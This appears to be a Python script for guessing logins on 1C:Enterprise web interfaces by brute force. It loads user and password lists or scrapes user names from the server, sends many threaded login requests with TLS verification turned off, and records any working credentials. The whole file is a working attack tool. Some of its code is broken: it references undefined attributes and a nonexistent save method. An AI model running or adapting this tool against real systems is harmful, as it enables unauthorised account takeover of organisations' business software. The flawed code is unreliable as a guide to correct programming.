#!/usr/bin/env python

from time import sleep, strftime
import sys
import argparse
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict
import requests
import urllib3
import dataclasses
import logging

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.DEBUG)


def print_logo():
    pass


def parse_args() -> argparse.Namespace:
    """
    Parse args for utility

    :return: args
    :rtype: argparse.Namespace
    """
    parser = argparse.ArgumentParser(
        description="1C Web interface bruteforce",
        epilog="Example: python ./1c_brute.py"
        "<url> <users_file> <passwords_file>"
        )

    parser.add_argument(
        "Target",
        metavar="target",
        type=str,
        help="The target URI with directory of 1C webapp"
        "Example: https://localhost/docCorp"
    )

    parser.add_argument(
        "Username",
        metavar="users",
        type=str,
        help="The usernames list"
    )

    parser.add_argument(
        "Passwords",
        metavar="passwords",
        type=str,
        help="The passwords list"
    )

    parser.add_argument(
        "--delay",
        type=int,
        help="Time in milliseconds between each request",
        default=5
    )

    parser.add_argument(
        "--startat",
        type=int,
        help="Start at this line in the file",
        default=0
    )

    parser.add_argument(
        "--ignore-invalid-certificate",
        action="store_true",
        help="Ignore untrusted certs",
        default=True
    )

    parser.add_argument(
        "--check-empty-passwords",
        action="store_true",
        help="Check for users with empty passwords",
        default=False
    )

    parser.add_argument(
        "--save-results",
        action="store_true",
        help="Save results to file 'results.txt'",
        default=False
    )

    parser.add_argument(
        "--get-users",
        action="store_true",
        help="Auto get and parse users from <target_url>/e1cib/users",
        default=False
    )

    args = parser.parse_args()

    return args


@dataclasses.dataclass()
class ExploitConfig(object):
    """
    Config with params for bruteforce
    """

    clnId: str = "84c3db7e-661b-9350-57ac-7164384e6c43"
    lang: str = "ru_RU"
    version: str = "8.3.18.1208"
    startAt: int = 0

    target: str = ""
    usernames_file: str = "users.txt"
    passwords_file: str = "pass.txt"
    threads: int = 10
    delay: int = 5
    ignoreBadCerts: bool = False
    check_empty_passwords: bool = False
    get_users: bool = False

    reseturl: str = ""
    resetdata = {"root": "{}"}

    def __init__(
        self,
        target: str,
        usernames_file: str,
        passwords_file: str,
        startAt: int,
        delay: int,
        ignoreBadCerts: bool,
        check_empty_passwords: bool,
        get_users: bool,
        version: str
    ):
        self.target = target
        self.usernames_file = usernames_file
        self.passwords_file = passwords_file
        self.startAt = startAt
        self.delay = delay
        self.ignoreBadCerts = ignoreBadCerts
        self.check_empty_passwords = check_empty_passwords
        self.get_users = get_users
        self.version = version

        self.reseturl = f"{target}/{self.lang}/e1cib/logout"


class FileHandler(object):
    """
    Class for managing operations with text files
    """

    @staticmethod
    def load(filename: str) -> List[str]:
        """
        Load strings from file

        :param filename: file data getting
        :type filename: str
        :return: list of strings
        :rtype: List[str]
        """
        data: List[str] = []
        try:
            with open(filename, "r", encoding="UTF8") as file:
                data = file.readlines()

            logger.info(f"Data successfully loaded from '{filename}'")
        except IOError as e:
            logger.exception(
                f"Failed to load data from file '{filename}': {e}"
            )

        return data

    @staticmethod
    def save_line(filename: str, data: str):
        """
        Append string to the end of provided file

        :param filename: file for data saving
        :type filename: str
        :param data: data to save
        :type data: str
        """
        try:
            with open(filename, "a", encoding="UTF8") as file:
                file.write(f"{data}\n")

            logger.info(f"Data successfully saved to {filename}")
        except IOError as e:
            logger.exception(f"Failed to save data to file {filename}: {e}")


class Exploit(object):
    """
    Class for bruteforce
    """
    _config: ExploitConfig = None
    found_credentials: List[str] = []

    def __init__(
        self,
        target: str,
        usernames_file: str,
        passwords_file: str,
        startAt: int,
        delay: int,
        ignoreBadCerts: bool,
        check_empty_passwords: bool,
        get_users: bool
    ):
        version = self._determine_version()

        self._config = ExploitConfig(
            target=target,
            usernames_file=usernames_file,
            passwords_file=passwords_file,
            startAt=startAt,
            delay=delay,
            ignoreBadCerts=ignoreBadCerts,
            check_empty_passwords=check_empty_passwords,
            get_users=get_users,
            version=version
        )

    def _get_users(self) -> List[str]:
        """
        Send request to get users

        :return: list of users in system
        :rtype: List[str]
        """
        url = f"{self._config.target}/e1cib/users"
        users: List[str] = []
        try:
            request = requests.post(
                url,
                verify=not self._config.ignoreBadCerts
            )
            users = list(request.content)

        except Exception as e:
            logger.exception(
                "[!] Unable to get users."
                " Try again or provide users manually!"
                f" {e}"
            )
            sys.exit(0)

        return users

    def _prepare_cred(self, login: str, password: str = None) -> str:
        """
        Encode in base64 login and password for request

        :param login: login for encoding
        :type login: str
        :param password: passwords for encoding, defaults to None
        :type password: str, optional
        :return: encoded cred
        :rtype: str
        """
        if self.config.check_empty_passwords:
            login += ""
            return base64.b64encode(
                f"{login}".encode("utf-8")
            ).decode("utf-8")

        return base64.b64encode(
            f"{login}:{password}".encode("utf-8")
        ).decode("utf-8")

    def _determine_version(self) -> str:
        return "8.3.18.1208"

    def _brute(self, login: str, password: str):
        """
        Send request with provided login and password

        :param login: login to try
        :type login: str
        :param password: password to try
        :type password: str
        """
        cred = self._prepare_cred(login, password)
        url = f"{self._config.target}/{self._config.lang}/e1cib/login?version={self._config.version}&cred={cred}&vl={self._config.lang}&clnId={self._config.clnId}"  # noqa
        try:
            http = requests.post(url, verify=not self._config.ignoreBadCerts)
            logger.debug(
                f"[{http.status_code}], {login}:{password}"
            )
            match http.status_code:
                case 200:
                    logging.info(
                        f"\033[92m[+] Success: {login}:{password}\033[0m"
                    )
                    self.found_credentials.append(f"{login}:{password}")
                    cookie = http.headers.get("Set-Cookie", "").split(";")[0]
                    if cookie:
                        resetheader = {"Cookie": cookie}
                        requests.post(
                            self._config.reseturl,
                            headers=resetheader,
                            json=self._config.resetdata,
                            verify=not self._config.ignoreBadCerts
                        )
                    if self._config.save_results:
                        FileHandler.save(
                            filename="results.txt",
                            data=f"{login}:{password}\n"
                        )
                case 400:
                    logging.error(
                        "No free license for new user's session. Try later."
                    )
                    sys.exit(0)

            sleep(self._config.delay)

        except requests.exceptions.RequestException as e:
            logging.exception(f"[!] Error: {e}")

    def start_exploit(self) -> List[str]:
        """
        Start bruteforce

        :return: found credentials
        :rtype: List[str]
        """
        if self._config.get_users:
            users = self._get_users()
        else:
            users = FileHandler.load(
                filename=self._config.usernames_file
            )[self._config.startAt:]

        logger.info(
            f"Number of users: {len(users)}"
        )
        if not users:
            logging.error(
                "[!] Users not provided. Shutting down..."
            )
            sys.exit(0)

        passwords = []
        if not self._config.check_empty_passwords:
            passwords = FileHandler.load(filename=self._config.passwords_file)
        logger.info(
            f"Number of passwords: {len(passwords)}"
        )

        with ThreadPoolExecutor(max_workers=self._config.threads) as executor:
            futures = [
                executor.submit(self._brute, user, password)
                for user
                in users
                for password
                in passwords
            ]
            try:
                for future in as_completed(futures):
                    future.result()
            except KeyboardInterrupt:
                logging.info("\n[!] Interrupted by user. Shutting down...")
                executor.shutdown(wait=False)
                for future in futures:
                    future.cancel()
                raise

        return self.found_credentials


def main():
    args = parse_args()

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    exploit = Exploit(
        target=args.Target,
        usernames_file=args.Username,
        passwords_file=args.Passwords,
        startAt=args.startat,
        delay=args.delay / 1000,  # from ms to s
        ignoreBadCerts=args.ignore_invalid_certificate,
        check_empty_passwords=args.check_empty_passwords,
        get_users=args.get_users
    )

    logging.info(
        "\033[94mBruteforce started at " + strftime("%d-%m-%Y %H:%M:%S %Z") + "\033[0m\n"  # noqa
    )
    found_credentials = exploit.start_exploit()

    logging.info(
        "\n\033[94mBruteforce completed at " + strftime("%d-%m-%Y %H:%M:%S %Z") + "\033[0m"  # noqa
    )
    logging.info(
        f"\033[94mFound \033[93m\033[1m{len(found_credentials)}\033[0m \033[94mpassword(s).\033[0m"  # noqa
    )

    if found_credentials:
        logging.info("\033[94mCredentials found:\033[0m")
        for cred in found_credentials:
            logging.info(f"\033[92m{cred}\033[0m")


if __name__ == "__main__":
    main()
